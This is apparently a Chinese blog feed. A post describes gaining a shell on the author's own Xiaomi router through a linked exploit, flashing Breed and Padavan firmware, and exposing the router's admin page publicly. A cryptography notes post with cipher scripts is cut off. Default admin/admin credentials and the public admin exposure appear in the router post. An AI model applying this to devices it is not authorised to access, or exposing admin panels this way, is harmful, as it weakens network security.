    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-rlBMVwsS" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="4940920" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前实现了校园网内的笔记本远程唤醒。当时确实以为自己成功了，直到第二天。</p><p>第二天一醒来我就拿出平板准备远程唤醒床下的笔记本，开始过上小康生活。但是却失败了。这让我非常纳闷。</p><p>查询资料过后，推测原因应该是学校的路由器没有将笔记本的mac和ip进行绑定，即没有进行arp绑定。</p><p>这就导致笔记本睡眠或者关机超过两分钟，ip和mac的信息就从路由器的缓存中删除了，之后想要唤醒也就不可能了。</p><p>于是我就打算在宿舍布置一台路由器，路由器因为一直开着，学校路由器就不会把信息从arp表中删除。从而实现唤醒。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><ol><li><p>我买的路由器是<code>小米路由器4A千兆版 XiaoMi Route 4A</code>。它自带的rom其实非常不错，界面也非常美观。除了它有一个致命缺陷，它不支持arp绑定。这令我非常无语。在手机和笔记本都连在路由器的情况下，我无法唤醒笔记本，简直离谱。当然貌似能通过命令的方式手动写arp表，但是当时还想着刷机完，就没尝试，<s>现在有点后悔了</s>。</p></li><li><p>给路由器刷机其实非常简单，首先我们得获得路由器的shell。但是坑爹的小米没有给你ssh的权限。所以一个大神直接用一个路由器管理界面的漏洞来直接get shell 2333。github仓库：<a href="https://github.com/acecilia/OpenWRTInvasion">acecilia/OpenWRTInvasion</a>。按照文档说明一步步来即可 get shell。</p></li><li><p>以上的脚本不光可以get shell，同时还在路由器的21端口开放了ftp服务器，我们可以用<code>winscp</code>来连接路由器，方便之后的文件传输。</p></li><li><p>在终端中输入以下命令来备份路由器的<code>eeprom</code>，<s>虽然好像没用</s>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd3 of=/tmp/eeprom.bin<br></code></pre></td></tr></table></figure><p>输完命令后，通过winscp把文件备份到电脑上。</p></li><li><p>下载breed的固件。链接 <a href="https://breed.hackpascal.net/breed-mt7621-pbr-m1.bin">https://breed.hackpascal.net/breed-mt7621-pbr-m1.bin</a> 。</p><p>breed就是一个bootloader，用它来可以刷其他固件，而且有了breed就不怕路由器变砖了。长按reset的情况下接通路由器电源，等路由器灯亮了10s左右放开手，路由器就能回到只有一个breed的初始状态，开始新的刷机，十分方便。</p><p>breed的固件可以在电脑上下好后通过winscp传到路由器的<code>/tmp</code>文件夹下。再输入以下指令刷入breed 固件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp &amp;&amp; mtd write breed-mt7621-pbr-m1.bin Bootloader<br></code></pre></td></tr></table></figure></li><li><p>之后路由器会自动重启，从路由器的LAN口扯出一根网线连到笔记本上，访问<code>192.168.1.1</code>即可进入breed控制界面。</p></li><li><p>然后去这个这个 仓库里下载 Openwrt 的breed直装版 <a href="https://github.com/ababwbq/Actions-OpenWrt-Xiaomi-R4A/actions">Actions · ababwbq/Actions-OpenWrt-Xiaomi-R4A (github.com)</a> 。直接装官网的版本会出错，估计官网是给你直接刷的，而不是通过breed来刷的。</p><p>下载以下文件，然后解压后就可以得到Openwrt的breed直装固件了。</p><p><img src="https://upyun.wuuconix.link/image-20210908235705985.png" alt="zip" /></p><p><img src="https://upyun.wuuconix.link/image-20210908235803358.png" alt="openwrt bin" /></p><p>这里我记得刷<code>sysupgrade</code>的固件即可。</p></li><li><p>openwrt的页面非常好看，功能也非常丰富，但是它有一个非常奇怪的特性。</p><p><img src="https://upyun.wuuconix.link/image-20210909190938360.png" alt="openwrt" /></p><p>因为学校上网首先需要过一遍锐捷的校园网认证。那路由器怎么过认证呢？</p><p>正常情况下，我们可以用一台设备连接路由器的网络，然后点开一个网页，这是网页就会自动跳转到认证界面，输入账号密码过后就能认证成功。而学校的网络只能识别到一个路由器完成了校园网认证，它没法检测到路由器下的内网。所以我们这样一干实际上就把路由器给认证了。</p><p>但是openwrt特立独行，我从LAN口接出一条网线给笔记本，结果笔记本无法跳出认证界面。如果用wifi连，能跳出来，但是一看ip，好家伙，ip是校园网的，认证的是笔记本，而不是路由器。</p><p>这非常奇怪，现在回想起来，感觉是openwrt的默认路由模式的问题，从现象来看openwrt像是在AP<code>(Access Point)</code>模式，就是一台具有无线的交换机。但是我找不到如何设置模式，网上也没有这种问题的解决方案。</p><p>当时我想到了一个解决方案，就是用我上次写的校园网自动认证脚本来让路由器过校园网认证。但是这起码得有<code>curl</code>命令，但是路由器默认没有<code>curl</code>，而下载命令需要网络。我甚至还试图用笔记本的网络来共享给路由器，结果不知道为什么不行，总之非常的折磨（</p><p>然后就放弃了，准备刷padavan。</p></li><li><p>padavan在breed里直接刷就行。固件我是用的恩山论坛这位老哥分享的 <a href="https://www.right.com.cn/forum/thread-4317222-1-1.html">小米路由器4A千兆版刷Padavan(WIN10刷,含刷死救砖)</a></p><p><img src="https://upyun.wuuconix.link/image-20210909192139371.png" alt="padanvan固件" /></p><p>padavan比openwrt好驯服多了，刷完笔记本连上LAN口网线，直接弹出了校园网认证界面，直接就把路由器给认证了。</p><p>以下是padavan默认的信息</p><blockquote><ul><li>新固件网关：192.168.123.1</li><li>管理页面：<a href="http://my.router">http://my.router</a></li><li>管理账号：admin/admin</li><li>wifi名称：pdcn</li><li>wifi密码：1234567890</li></ul></blockquote><p>后台访问界面用的是HTTP Basic认证。</p><p><img src="https://upyun.wuuconix.link/image-20210909192426664.png" alt="my.router" /></p><p><img src="https://upyun.wuuconix.link/image-20210909192525402.png" alt="padavan管理界面" /></p><p>界面没有openwrt和小米原rom好看，但是功能十分丰富。我一开始买路由器就是为了解决远程唤醒笔记本的问题，我惊喜地发现它在管理界面可以直接唤醒设备。</p><p><img src="https://upyun.wuuconix.link/image-20210909192740888.png" alt="网络唤醒功能" /></p><p>这就十分方便了，那我们就不需要什么WOL软件，更不需要什么麻烦的端口转发了，我们唯一需要干的事就是保持我们可以访问到路由器管理界面。</p><p>我们首先打开 <code>高级设置-&gt;防火墙-&gt;允许从互联网设置MT7621_7603_7612_128M</code>的开关，这样就能在校园网内访问到管理界面了。</p><p><img src="https://upyun.wuuconix.link/image-20210909193337738.png" alt="允许从互联网设置MT7621_7603_7612_128M" /></p><p>然后我又用了实验室的主机做了管理界面的反代，再把服务内网穿透给阿里云服务器，最终实现了公网打开管理界面。</p><p>但是这样还是不够方便，于是我用Burp抓了个包。</p><p><img src="https://upyun.wuuconix.link/image-20210909193853415.png" alt="burp抓包" /></p><p>也就是说我们唤醒笔记本只需要发送这样一个HTTP报文就可以了，那我们如何借助手机或者平板来实现这个功能了。</p><p>这里就要介绍无敌Burpsuite的强大功能了，分别是<code>Copy as requests</code>和<code>Copy as curl command</code>，前者可以把HTTP报文转化为python的requests请求，后者可以直接转化为shell中的curl方式。</p><p><img src="https://upyun.wuuconix.link/image-20210909194254871.png" alt="Copy as" /></p><p>这样我就得到了两个脚本。运行任意一个就可以在公网唤醒我的笔记本。</p><p><img src="https://upyun.wuuconix.link/image-20210909194402015.png" alt="两个牛逼的脚本" /></p></li></ol><h2 id="视频演示"><a class="markdownIt-Anchor" href="#视频演示"></a> 视频演示</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=505393262&bvid=BV1Mg41157yT&cid=405455723&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>刷机过程挺有趣的，学习到了许多。</p><p>解决了之前学校路由器没有arp绑定的痛点。实现了真正的随时<code>(电脑关机或睡眠多久都没事)</code>随地<code>(公网唤醒)</code>唤醒笔记本。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>route</tag>
      
      <tag>breed</tag>
      
      <tag>openwrt</tag>
      
      <tag>padavan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践笔记</title>
    <link href="/2021/09/07/cryptography/"/>
    <url>/2021/09/07/cryptography/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-pHvscGAP" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1436910579" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><style>    .center {         width: auto;        display: table;        margin-left: auto;        margin-right: auto;    }</style><h2 id="caesar-cipher"><a class="markdownIt-Anchor" href="#caesar-cipher"></a> Caesar Cipher</h2><p>凯撒密码。所有的字母全部往后移3位。比如<code>abc</code>则变成<code>def</code>。</p><h2 id="shift-cipher"><a class="markdownIt-Anchor" href="#shift-cipher"></a> Shift Cipher</h2><p>移位密码。和凯撒密码原理类似。只不过移动的key不是3而可以是<code>0~25</code>中的任何值。所以Caesar Cipher是Shift Cipher的一种特例。</p><p>下面写了两个移位密码的编码和解码的小程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span>(sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-s&#x27;</span>):<br>    plaintext = sys.argv[<span class="hljs-number">2</span>]<br>    cipyertext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-n&#x27;</span>):<br>        key = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">4</span>]) % <span class="hljs-number">26</span><br>        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> plaintext:<br>            <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                cipyertext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) + key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) )<br>            <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                cipyertext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) + key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) )<br>            <span class="hljs-keyword">else</span>:<br>                cipyertext += word<br>        <span class="hljs-built_in">print</span>(cipyertext)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span>(sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-s&#x27;</span>):<br>    ciphertext = sys.argv[<span class="hljs-number">2</span>]<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-n&#x27;</span>):<br>        key = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">4</span>]) % <span class="hljs-number">26</span><br>        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> ciphertext:<br>            <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                plaintext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) - key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">26</span>) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) )<br>            <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                plaintext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) - key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">26</span>) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) )<br>            <span class="hljs-keyword">else</span>:<br>                plaintext += word<br>        <span class="hljs-built_in">print</span>(plaintext)<br>    <span class="hljs-keyword">elif</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;--all&#x27;</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-a&#x27;</span>):<br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>):<br>            plaintext = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> ciphertext:<br>                <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                    plaintext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) - key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">26</span>) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) )<br>                <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                    plaintext += <span class="hljs-built_in">chr</span>( (<span class="hljs-built_in">ord</span>(word) - key - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">26</span>) %<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) )<br>                <span class="hljs-keyword">else</span>:<br>                    plaintext += word<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;key: <span class="hljs-subst">&#123;key&#125;</span>   <span class="hljs-subst">&#123;plaintext&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210907211419350.png" alt="shift cipher encode" /></p><p><img src="https://upyun.wuuconix.link/image-20210907211516787.png" alt="shift cipher decode" /></p><h2 id="affine-cipher"><a class="markdownIt-Anchor" href="#affine-cipher"></a> Affine Cipher</h2><p>仿射密码。和凯撒密码和移位密码类似。前两者都是在原字母的基础上加上一个常数k。而仿射密码则是在原字母的基础上乘上一个常数a，再加上一个常数b。当然最后都是需要模26的。</p><p>为了保证能够被解密，a和26必须是互素的，因为只有这样，a才有逆元，才能够解密。</p><p>求逆元可以用拓展欧几里得算法，脑子太笨，<s>还看不懂算法的原理</s>。</p><p>以下是加密和解密的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span>(sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-s&#x27;</span>):<br>    plaintext = sys.argv[<span class="hljs-number">2</span>]<br>    cipyertext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-a&#x27;</span>):<br>        key1 = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">4</span>])<br>        <span class="hljs-keyword">if</span> (key1 <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>]):<br>            <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;-b&#x27;</span>):<br>                key2 = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">6</span>])<br>                <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> plaintext:<br>                    <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                        cipyertext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) * key1 + key2) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>                    <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                        cipyertext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) * key1 + key2) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>                    <span class="hljs-keyword">else</span>:<br>                        cipyertext += word<br>                <span class="hljs-built_in">print</span>(cipyertext)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">5</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;error: a must be one of [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ext_euclid</span>(<span class="hljs-params">a, b</span>):     <br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:         <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a     <br>    <span class="hljs-keyword">else</span>:         <br>        x, y, q = ext_euclid(b, a % b) <br>        <span class="hljs-comment"># q = gcd(a, b) = gcd(b, a%b)         </span><br>        x, y = y, (x - (a // b) * y)         <br>        <span class="hljs-keyword">return</span> x, y, q<br><br><span class="hljs-keyword">if</span>(sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-s&#x27;</span>):<br>    ciphertext = sys.argv[<span class="hljs-number">2</span>]<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-a&#x27;</span>):<br>        key1 = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">4</span>])<br>        <span class="hljs-keyword">if</span> (key1 <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>]):<br>            key1_reverse = (ext_euclid(key1, <span class="hljs-number">26</span>)[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> <span class="hljs-comment">#逆元</span><br>            <span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;-b&#x27;</span>):<br>                key2 = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">6</span>]) % <span class="hljs-number">26</span><br>                <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> ciphertext:<br>                    <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                        plaintext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - key2 + <span class="hljs-number">26</span>) * key1_reverse) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) )<br>                    <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                        plaintext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - key2 + <span class="hljs-number">26</span>) * key1_reverse) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) )<br>                    <span class="hljs-keyword">else</span>:<br>                        plaintext += word<br>                <span class="hljs-built_in">print</span>(plaintext)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;error: a must be one of [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]&quot;</span>)<br>    <span class="hljs-keyword">elif</span> (sys.argv[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;--all&#x27;</span>): <span class="hljs-comment">#尝试所有的a,b组合</span><br>        <span class="hljs-keyword">for</span> key1 <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>]:<br>            key1_reverse = ((ext_euclid(key1, <span class="hljs-number">26</span>))[<span class="hljs-number">0</span>] + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span><br>            <span class="hljs-keyword">for</span> key2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>):<br>                plaintext = <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> ciphertext:<br>                    <span class="hljs-keyword">if</span> (word &lt;= <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;a&quot;</span>):<br>                        plaintext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - key2 + <span class="hljs-number">26</span>) * key1_reverse) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) )<br>                    <span class="hljs-keyword">elif</span> (word &lt;= <span class="hljs-string">&quot;Z&quot;</span> <span class="hljs-keyword">and</span> word &gt;= <span class="hljs-string">&quot;A&quot;</span>):<br>                        plaintext += <span class="hljs-built_in">chr</span>( ((<span class="hljs-built_in">ord</span>(word) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - key2 + <span class="hljs-number">26</span>) * key1_reverse) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) )<br>                    <span class="hljs-keyword">else</span>:<br>                        plaintext += word<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;a: <span class="hljs-subst">&#123;key1&#125;</span> b: <span class="hljs-subst">&#123;key2&#125;</span>  <span class="hljs-subst">&#123;plaintext&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;unrecognized signal <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210907231458120.png" alt="affine cipher encode decode" /></p><p><img src="https://upyun.wuuconix.link/image-20210907231543681.png" alt="尝试所有的a和b" /></p><p>仿射密码的密钥空间是<span 